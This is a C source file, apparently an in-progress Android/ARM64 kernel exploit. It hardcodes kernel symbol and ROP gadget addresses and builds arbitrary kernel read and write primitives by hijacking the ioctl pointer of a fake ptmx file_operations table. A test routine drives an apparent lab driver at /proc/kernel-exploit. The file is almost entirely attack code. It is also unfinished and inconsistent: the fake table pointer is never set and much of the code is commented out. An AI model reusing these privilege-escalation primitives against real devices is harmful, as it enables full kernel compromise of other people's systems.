#include <sys/wait.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <errno.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <asm/ioctl.h>
#include <sys/prctl.h>
#include <sys/ioctl.h>
#include <sys/syscall.h>

#define PTM_UNIX98_LOOKUP        0xffffff80085391ec
#define PTY_UNIX98_INSTALL       0xffffff8008539b28
#define PTY_UNIX98_REMOVE        0xffffff8008539b40
#define PTY_OPEN                 0xffffff8008539780
#define PTY_CLOSE                0xffffff800853961c
#define PTY_WRITE                0xffffff80085395a4
#define PTY_WRITE_ROOM           0xffffff8008539e04
/*#define PTY_IOCTL                0xffffff800853be30*/
#define TEST_IOCTL               0xffffff800825da48
#define PTMX_CDEV                0xffffff8009078f58
/*ffffff8009078f58 b ptmx_cdev*/
/*ffffff800825da3c T stack_test_ioctl*/
/*ffffff800853ae30 t pty_unix98_ioctl*/
struct proc_data {
        void *addr;
        unsigned long val;
};

#define ioctl_syscall(n, efd, cmd, arg) \
        eabi_syscall(n, efd, cmd, arg)

/*
 * rop read
 * ffffffc000300060:       f9405440        ldr     x0, [x2,#168]
 * ffffffc000300064:       d65f03c0        ret
 */
#define ROP_READ                0xffffffc000300060

/*
 ＊　rop write
 * ffffffc000671a58:       b9000041        str     w1, [x2]
 * ffffffc000671a5c:       d65f03c0        ret
 */
#define ROP_WRITE               0xffffffc000671a58


unsigned long fake_ptm_fops;
unsigned int ptm_fd;

static int kernel_write_32(unsigned long addr, unsigned int val)
{
        unsigned long arg;

        *(unsigned long*)(fake_ptm_fops + 12 * 8) = ROP_WRITE;

        arg = addr;
        ioctl_syscall(__NR_ioctl, ptm_fd, val, arg);
        return 0;
}

static int kernel_write(unsigned long addr, unsigned long val)
{
        unsigned int val32;

        val32 = (unsigned int)val;
        kernel_write_32(addr, val32);

        val32 = (unsigned int)((val >> 32) & 0xffffffff);
        kernel_write_32(addr + 4, val32);
        return 0;
}

static int kernel_read_32(unsigned long addr, unsigned int *val)
{
        int ret;
        unsigned long arg;

        *(unsigned long*)(fake_ptm_fops + 12 * 8) = ROP_READ;
        arg = addr - 168;
        errno = 0;
        ret = ioctl_syscall(__NR_ioctl, ptm_fd, 0xdeadbeef, arg);
        *val = ret;
        return 0;
}

int set_fake_func()
{

        void *map;
	int map_fd = open("/data/local/tmp/map_fd", O_RDWR | O_CREAT);
        /*map = mmap((void *)0x80000000, (size_t)0x10000, PROT_READ|PROT_WRITE|MAP_LOCKED, MAP_ANONYMOUS|MAP_SHARED, -1, (off_t)0);*/
        map = mmap((void *)0x80000000, (size_t)0x10000, PROT_READ|PROT_WRITE|MAP_LOCKED, MAP_ANONYMOUS|MAP_SHARED, map_fd, (off_t)0);
        if(map == MAP_FAILED) {
                printf("[-] Failed to mmap landing (%d-%s)\n", errno, strerror(errno));
                return -1;
        }
	unsigned long buf = 0xdeadbeef;
	write(map_fd, &buf, sizeof(buf));
	msync(map, 0x10000, MS_ASYNC);
	munmap(map, 0x10000);
	close(map_fd);
	/**(unsigned long *)map = 0xdeadbeefdeadbeaf;*/

        /*fake_ptm_fops = (unsigned long)map;*/
        /*printf("[+] fake_ptm_fops = 0x%lx\n",fake_ptm_fops);*/
	/**(unsigned long*)(fake_ptm_fops + 0 * 8) = PTM_UNIX98_LOOKUP;*/
	/**(unsigned long*)(fake_ptm_fops + 1 * 8) = PTY_UNIX98_INSTALL;*/
	/**(unsigned long*)(fake_ptm_fops + 2 * 8) = PTY_UNIX98_REMOVE;*/
	/**(unsigned long*)(fake_ptm_fops + 3 * 8) = PTY_OPEN;*/
	/**(unsigned long*)(fake_ptm_fops + 4 * 8) = PTY_CLOSE;*/
	/**(unsigned long*)(fake_ptm_fops + 5 * 8) = TEST_IOCTL;*/
	/**(unsigned long*)(fake_ptm_fops + 6 * 8) = TEST_IOCTL;*/
	/**(unsigned long*)(fake_ptm_fops + 7 * 8) = PTY_WRITE;*/
	/**(unsigned long*)(fake_ptm_fops + 10 * 8) = PTY_WRITE_ROOM;*/
	/**(unsigned long*)(fake_ptm_fops + 11 * 8) = TEST_IOCTL;*/
        /**(unsigned long*)(fake_ptm_fops + 12 * 8) = TEST_IOCTL;*/
	/**(unsigned long*)(fake_ptm_fops + 14 * 8) = TEST_IOCTL;*/
	/**(unsigned long*)(fake_ptm_fops + 16 * 8) = TEST_IOCTL;*/
	/**(unsigned long*)(fake_ptm_fops + 21 * 8) = TEST_IOCTL;*/
	/**(unsigned long*)(fake_ptm_fops + 27 * 8) = TEST_IOCTL;*/

        return 0;
}

void create_tty_struct()
{
	int fd;
	char* path = "/dev/ptmx";
	int i;
	fd = open(path, O_WRONLY);
	if(fd < 0) {
		printf("[-] open %s fail %s\n",path, strerror(errno));
		return;
	}
	printf("current fd %d\n", fd);
	ptm_fd = fd;
}

do_test_ioctl()
{
	int fd;
	struct proc_data local_data = {0};
	/*create_tty_struct();*/
	set_fake_func();
	/*local_data.addr = (void *)(PTMX_CDEV + 8 * 9);*/
	/*local_data.val = (unsigned long)fake_ptm_fops;*/
	fd = open("/proc/kernel-exploit", O_RDWR);
	printf("open proc/kernel-exploit fd %lx\n", fd);
	/*fwrite(&local_data, sizeof(long) * 2, 1, fd);*/
	/*local_data.addr = (void *)(PTMX_CDEV + 8 * 9);*/
	/*local_data.val = (unsigned long)fake_ptm_fops;*/
	local_data.addr = (void *)(0xffffffc000000000 + 0x80000000);
	local_data.val = 0;
	read(fd, &local_data, 1);
	printf("data val %lx\n", local_data.val);
	close(fd);
	/*printf("before ioctl ptm_fd %d\n", ptm_fd);*/
	/*ioctl_syscall(__NR_ioctl, ptm_fd, 0xdeadbeef, 1);*/
	/*printf("after ioctl");*/
	close(ptm_fd);
}
